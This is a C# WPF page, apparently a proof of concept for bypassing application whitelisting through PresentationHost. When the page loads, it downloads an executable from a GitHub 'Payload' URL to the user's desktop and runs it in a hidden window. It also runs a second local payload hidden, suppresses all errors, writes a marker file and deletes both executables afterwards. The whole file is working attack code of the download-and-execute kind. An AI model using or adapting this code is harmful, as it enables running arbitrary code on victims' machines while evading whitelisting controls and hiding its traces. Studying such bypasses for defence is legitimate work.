using System;
using System.IO;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace powershell
{
    public partial class Page1 : Page
    {
        public Page1()
        {
            InitializeComponent();
            Execute();
        }
        private void Execute()
        {
            string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/PresentationHostBypass/PresentationHostOnlinePayload.exe";
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string fileName = "\\PresentationHostOnlinePayloadDownloaded.exe", myStringWebResource = null;
            string downloadPath = path + fileName;
            // Create a new WebClient instance.
            WebClient myWebClient = new WebClient();
            try {
                string title = "PresentationHost";
                string message = "Download path:" + downloadPath;
                //MessageBox.Show(message, title);
                // Download the Web resource and save it into the current filesystem folder.
                myWebClient.DownloadFile(remoteUri, downloadPath);
                System.Diagnostics.Process process = new System.Diagnostics.Process();
            } catch {
            }
            System.Diagnostics.Process processA = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
            startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfoA.FileName = downloadPath;
            processA.StartInfo = startInfoA;
            try {
                processA.Start();
            } catch {
            }
            
            string localPath = path + "\\PresentationHostOfflinePayload.exe";
            System.Diagnostics.Process processB = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfoB = new System.Diagnostics.ProcessStartInfo();
            startInfoB.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfoB.FileName = localPath;
            processB.StartInfo = startInfoB;
            try
            {
                string title = "PresentationHost";
                string message = "Local path:" + localPath;
                //MessageBox.Show(message, title);
                processB.Start();
            }
            catch
            {
            }

            string filename = "\\WLtester.txt";
            path += filename;
            using (FileStream file = File.Exists(path) ? File.Open(path, FileMode.Append) : File.Open(path, FileMode.CreateNew))
            {
                using (StreamWriter stream = new StreamWriter(file))
                {
                    stream.WriteLine("PresentationHostBypass.");
                }
            }

            File.Delete(downloadPath);
            File.Delete(localPath);
        }
    }
}
